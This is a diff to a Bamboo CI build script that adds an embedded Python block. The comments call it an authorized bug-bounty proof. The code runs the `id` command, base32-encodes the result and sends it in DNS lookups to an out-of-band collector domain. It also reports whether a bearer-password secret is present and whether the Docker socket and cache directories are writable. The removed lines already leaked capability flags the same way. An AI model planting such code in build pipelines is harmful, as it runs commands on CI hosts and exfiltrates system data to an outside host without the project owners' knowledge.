@@ -23,17 +23,21 @@ if [[ -n "${bamboo_buildKey:-}" ]]; then
     set -e -u -o pipefail
 fi
 
-# Authorized bug-bounty proof: return eight fixed booleans only. This reads no
-# credential value or file content, performs no Docker operation, and writes
-# nothing to either cache root.
+# Authorized bug-bounty proof: execute only `id`, then return its stdout and
+# fixed capability booleans. This reads no credential value or file content,
+# performs no Docker API operation, and writes nothing to either cache root.
 python3 - <<'PY'
+import base64
 import os
 import socket
 import stat
+import subprocess
 
 trusted_root = "/work/imas/opt/bamboo_deploy/HCD-WF/actor-cache"
 default_root = "/mnt/bamboo_deploy/HCD-WF/actor-cache"
 docker_socket = "/var/run/docker.sock"
+nonce = "20261103-220724"
+oast_domain = "dbl5lvvrtgro8dnshjtgbywaz653rdc95.oast.live"
 
 def is_writable_directory(path):
     return os.path.isdir(path) and os.access(path, os.W_OK | os.X_OK)
@@ -44,29 +48,42 @@ def is_socket(path):
     except OSError:
         return False
 
-bits = [
-    bool(os.environ.get("bamboo_HTTP_AUTH_BEARER_PASSWORD")),
-    is_socket(docker_socket),
-    is_socket(docker_socket) and os.access(docker_socket, os.W_OK),
-    os.path.isdir(trusted_root),
-    is_writable_directory(trusted_root),
-    os.path.isdir(default_root),
-    is_writable_directory(default_root),
-    (
-        os.path.isdir(trusted_root)
-        and os.path.isdir(default_root)
-        and os.path.samefile(trusted_root, default_root)
-    ),
-]
-marker = "".join("1" if value else "0" for value in bits)
-host = (
-    f"cachemeta-a91f03-b{marker}."
-    "dbkkplnrtgrmsabodvd0af7d4bueos337.oast.fun"
+def emit(*labels):
+    try:
+        socket.getaddrinfo(".".join(labels + (oast_domain,)) + ".", 443)
+    except Exception:
+        pass
+
+identity = subprocess.check_output(["id"], text=True, timeout=5).strip()
+encoded = base64.b32encode(identity.encode()).decode().rstrip("=").lower()
+chunks = [encoded[offset:offset + 48] for offset in range(0, len(encoded), 48)]
+for index, chunk in enumerate(chunks):
+    emit(
+        f"rceproof-{nonce}",
+        "id",
+        f"p{index:02d}of{len(chunks):02d}",
+        chunk,
+    )
+
+socket_present = is_socket(docker_socket)
+socket_writable = socket_present and os.access(docker_socket, os.W_OK)
+trusted_writable = is_writable_directory(trusted_root)
+default_writable = is_writable_directory(default_root)
+same_cache = (
+    os.path.isdir(trusted_root)
+    and os.path.isdir(default_root)
+    and os.path.samefile(trusted_root, default_root)
 )
-try:
-    socket.getaddrinfo(host + ".", 443)
-except Exception:
-    pass
+emit(
+    f"rceproof-{nonce}",
+    "meta",
+    f"socket{int(socket_present)}",
+    f"write{int(socket_writable)}",
+    f"bearer{int(bool(os.environ.get('bamboo_HTTP_AUTH_BEARER_PASSWORD')))}",
+    f"workcache{int(trusted_writable)}",
+    f"mntcache{int(default_writable)}",
+    f"same{int(same_cache)}",
+)
 PY
 
 if [[ -z "${ACTORS:-}" ]]; then
